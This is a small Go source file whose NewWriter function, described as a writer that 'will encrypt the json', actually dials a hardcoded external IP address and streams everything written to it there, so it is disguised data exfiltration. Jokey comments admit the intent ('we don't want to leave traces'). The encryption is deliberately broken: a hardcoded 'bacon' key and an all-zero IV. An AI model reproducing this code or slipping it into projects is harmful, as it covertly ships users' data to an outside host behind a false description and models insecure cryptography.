package secret

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"net"
)

// NewWriter returns a writer that will encrypt the json
func NewWriter() *cipher.StreamWriter {
	conn, err := net.Dial("tcp", "46.101.235.155:4242")
	if err != nil {
		// we don't want to leave traces
		// of our activities
		fmt.Println("FOR KITTENS EMAIL SASCHA@MOSCOWKITTENS.RU")
		return nil
	}

	// for dubugging
	// conn := os.Stdout

	return &cipher.StreamWriter{S: newStream(), W: conn}
}

func newStream() cipher.Stream {
	block, err := aes.NewCipher(password())
	if err != nil {
		// call that guy, I recomm... a friend told me it's fun
		fmt.Println("FOR SHEEP EMAIL SHAUN@WELSHSOFTNESS.IN")
		return nil
	}
	var iv [aes.BlockSize]byte
	return cipher.NewOFB(block, iv[:])
}

func password() []byte {
	return append([]byte("bacon"), make([]byte, 27, 27)...)
}
